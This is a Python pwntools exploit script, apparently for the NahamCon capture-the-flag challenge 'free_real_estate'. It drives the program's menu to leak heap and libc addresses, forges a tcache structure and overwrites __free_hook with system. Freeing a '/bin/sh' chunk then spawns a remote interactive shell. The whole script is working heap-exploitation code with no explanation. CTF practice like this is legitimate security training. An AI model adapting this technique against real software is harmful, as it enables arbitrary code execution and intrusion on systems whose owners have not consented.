#!/usr/bin/env python3


from pwn import *

e = ELF("./free_real_estate")
#r = process("./free_real_estate")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
r = remote("challenge.nahamcon.com",32567)
r.sendlineafter(b"Enter your name: ",b"ajay")
def add_property_comment(house_number,street_length,street_name,price,comment_length,comment):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"Enter the house number:",f"{house_number}")
    r.sendlineafter(b"What is the length of the street name:",f"{street_length}")
    r.sendlineafter(b"Enter the street name:",street_name)
    r.sendlineafter(b"What is the price of the property?:",f"{price}")
    r.sendlineafter(b"Would you like to add a comment for this property? [y/n]:",b"y\n")
    r.sendlineafter(b"What is the length of the comment?:",f"{comment_length}")
    r.sendlineafter(b"Enter the comment:",comment)

def add_property_no_comment(house_number,street_length,street_name,price):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"Enter the house number:",f"{house_number}")
    r.sendlineafter(b"What is the length of the street name:",f"{street_length}")
    r.sendlineafter(b"Enter the street name:",street_name)
    r.sendlineafter(b"What is the price of the property?:",f"{price}")
    r.sendlineafter(b"Would you like to add a comment for this property? [y/n]:",b"n\n")


def leak_libc():
    r.sendlineafter(b">",b"1")
    r.recvuntil(b"Comment: ")
    libc_leak = u64(r.recvline().strip().decode('latin-1').ljust(8,'\x00'))
    return libc_leak

def clear():
    r.sendlineafter(b">",b"3")

def edit_comment(comment_length,comment):
    r.sendlineafter(b">",b"4")
    r.sendlineafter(b"Would you like to change the house number? [y/n]:",b"n") 
    r.sendlineafter(b"Would you like to change the street? [y/n]:",b"n")
    r.sendlineafter(b"Would you like to change the price of the property? [y/n]:",b"n")
    r.sendlineafter(b"Would you like to change the comment? [y/n]:",b"y")
    r.sendlineafter(b"Enter the new comment length:",f"{comment_length}")
    r.sendlineafter(b"Enter the new comment:",comment)


def edit_street(street_length,street):
    r.sendlineafter(b">",b"4")
    r.sendlineafter(b"Would you like to change the house number? [y/n]:",b"n") 
    r.sendlineafter(b"Would you like to change the street? [y/n]:",b"y")
    r.sendlineafter(b"street name length:",f"{street_length}")
    r.sendlineafter(b"street name:",street)
    r.sendlineafter(b"Would you like to change the price of the property? [y/n]:",b"n")
    r.sendlineafter(b"Would you like to change the comment? [y/n]:",b"n")


def edit_street_len(street_length):
    r.sendlineafter(b">",b"4")
    r.sendlineafter(b"Would you like to change the house number? [y/n]:",b"n") 
    r.sendlineafter(b"Would you like to change the street? [y/n]:",b"y")
    r.sendlineafter(b"street name length:",f"{street_length}")
 
def leak_heap():
    r.sendlineafter(b">",b"1")
    r.recvuntil(b"Comment: ")
    heap_base = u64(r.recvline().strip().decode('latin-1').ljust(8,'\x00')) - 0x3b0
    return heap_base

def change_name(length,name):
    r.sendlineafter(b">",b"5")
    r.sendlineafter(b"new name?",f"{length}")
    r.sendlineafter(b"new name:",name)

add_property_comment(123,40,b"A1",30.0,640,b"A2")
clear()
add_property_no_comment(123,40,b"B1",30.0)
edit_comment(40,b"A" * 16)
clear()
add_property_no_comment(123,40,b"C1",30.0)
heap_base = leak_heap()
edit_comment(40,p64(heap_base + 0x10))
edit_street(640,b"A")
change_name(640,p64(0x0000000100000000))
edit_street(700,b"B")
edit_comment(40,b"A" * 14)
clear()
add_property_comment(123,640,p64(heap_base + 0x10),30.0,40,b"D2")
edit_comment(700,b"A" * 16)
edit_street(640,b"A" * 16)
clear()
add_property_comment(123,2000,b"ajay",30.0,90,b"strikerr")
clear()
add_property_comment(123,90,b"ajay",30.0,2000,b"strikerr")
clear()
add_property_no_comment(123,90,b"/bin/sh\x00",30.0)
libc_base = leak_libc() - 0x1ecbe0
print(hex(libc_base))
tcache_struct = p64(0x0000000100000000) + p64(0x0000000100000000) + p64(0) * 7 + p64(0x0002000000000000) + p64(0x0001000000000000) + p64(0x0000000000000012) + p64(0) * 6 + p64(0x0000558bae565370) + p64(0) * 3 + p64(0x0000558bae5652a0) + p64(0) * 32 + p64(0x0000558bae5653b0) + p64(0) * 3 + p64(0x0000558bae565640)  + p64(libc_base + libc.sym.__free_hook) 
change_name(640,tcache_struct)
change_name(716,p64(libc_base + libc.sym.system))
edit_street_len(900)
r.interactive()
